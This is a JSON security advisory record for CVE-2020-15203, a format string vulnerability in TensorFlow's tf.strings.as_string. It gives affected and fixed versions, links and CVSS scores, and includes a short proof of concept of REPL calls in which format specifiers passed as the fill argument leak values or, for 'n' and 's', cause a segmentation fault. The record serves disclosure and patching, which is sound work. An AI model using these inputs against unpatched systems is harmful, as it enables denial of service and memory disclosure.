{
  "Identifier": "CVE-2020-15203",
  "PackageSlug": "pypi/tensorflow-cpu",
  "Title": "Denial of Service in Tensorflow",
  "Description": "By controlling the `fill` argument of [`tf.strings.as_string`](https://www.tensorflow.org/api_docs/python/tf/strings/as_string), a malicious attacker is able to trigger a format string vulnerability due to the way the internal format use in a `printf` call is constructed: https://github.com/tensorflow/tensorflow/blob/0e68f4d3295eb0281a517c3662f6698992b7b2cf/tensorflow/core/kernels/as_string_op.cc#L68-L74\n\nThis can result in unexpected output:\n```python\nIn [1]: tf.strings.as_string(input=[1234], width=6, fill='-')\nOut[1]: \u003ctf.Tensor: shape=(1,), dtype=string, numpy=array(['1234  '], dtype=object)\u003e\nIn [2]: tf.strings.as_string(input=[1234], width=6, fill='+')\nOut[2]: \u003ctf.Tensor: shape=(1,), dtype=string, numpy=array([' +1234'], dtype=object)\u003e\nIn [3]: tf.strings.as_string(input=[1234], width=6, fill=\"h\")\nOut[3]: \u003ctf.Tensor: shape=(1,), dtype=string, numpy=array(['%6d'], dtype=object)\u003e\nIn [4]: tf.strings.as_string(input=[1234], width=6, fill=\"d\")\nOut[4]: \u003ctf.Tensor: shape=(1,), dtype=string, numpy=array(['12346d'], dtype=object)\u003e\nIn [5]: tf.strings.as_string(input=[1234], width=6, fill=\"o\")\nOut[5]: \u003ctf.Tensor: shape=(1,), dtype=string, numpy=array(['23226d'], dtype=object)\u003e\nIn [6]: tf.strings.as_string(input=[1234], width=6, fill=\"x\")\nOut[6]: \u003ctf.Tensor: shape=(1,), dtype=string, numpy=array(['4d26d'], dtype=object)\u003e\nIn [7]: tf.strings.as_string(input=[1234], width=6, fill=\"g\")\nOut[7]: \u003ctf.Tensor: shape=(1,), dtype=string, numpy=array(['8.67458e-3116d'], dtype=object)\u003e\nIn [8]: tf.strings.as_string(input=[1234], width=6, fill=\"a\")\nOut[8]: \u003ctf.Tensor: shape=(1,), dtype=string, numpy=array(['0x0.00ff7eebb4d4p-10226d'], dtype=object)\u003e\nIn [9]: tf.strings.as_string(input=[1234], width=6, fill=\"c\")\nOut[9]: \u003ctf.Tensor: shape=(1,), dtype=string, numpy=array(['\\xd26d'], dtype=object)\u003e\nIn [10]: tf.strings.as_string(input=[1234], width=6, fill=\"p\")\nOut[10]: \u003ctf.Tensor: shape=(1,), dtype=string, numpy=array(['0x4d26d'], dtype=object)\u003e\nIn [11]: tf.strings.as_string(input=[1234], width=6, fill='m')\nOut[11]: \u003ctf.Tensor: shape=(1,), dtype=string, numpy=array(['Success6d'], dtype=object)\u003e\n```\n\nHowever, passing in `n` or `s` results in segmentation fault.",
  "Date": "2024-10-28",
  "Pubdate": "2020-09-25",
  "AffectedRange": "\u003c1.15.4||\u003e=2.0.0,\u003c2.0.3||\u003e=2.1.0,\u003c2.1.2||\u003e=2.2.0,\u003c2.2.1||==2.2.0||\u003e=2.3.0,\u003c2.3.1||==2.3.0",
  "FixedVersions": [
    "1.15.4",
    "2.0.3",
    "2.1.2",
    "2.2.1",
    "2.3.1"
  ],
  "AffectedVersions": "All versions before 1.15.4, all versions starting from 2.0.0 before 2.0.3, all versions starting from 2.1.0 before 2.1.2, all versions starting from 2.2.0 before 2.2.1, version 2.2.0, all versions starting from 2.3.0 before 2.3.1, version 2.3.0",
  "NotImpacted": "",
  "Solution": "Upgrade to versions 1.15.4, 2.0.3, 2.1.2, 2.2.1, 2.3.1 or above.",
  "Urls": [
    "https://nvd.nist.gov/vuln/detail/CVE-2020-15203",
    "https://github.com/advisories/GHSA-xmq7-7fxm-rr79",
    "https://github.com/tensorflow/tensorflow/security/advisories/GHSA-xmq7-7fxm-rr79",
    "https://github.com/tensorflow/tensorflow/commit/33be22c65d86256e6826666662e40dbdfe70ee83",
    "https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-cpu/PYSEC-2020-283.yaml",
    "https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow-gpu/PYSEC-2020-318.yaml",
    "https://github.com/pypa/advisory-database/tree/main/vulns/tensorflow/PYSEC-2020-126.yaml",
    "https://github.com/tensorflow/tensorflow",
    "https://github.com/tensorflow/tensorflow/releases/tag/v2.3.1"
  ],
  "CvssV2": "AV:N/AC:L/Au:N/C:N/I:N/A:P",
  "CvssV3": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
  "UUID": "da68f6a2-4b1c-47ea-9b8f-f1e9bb0ba1fd"
}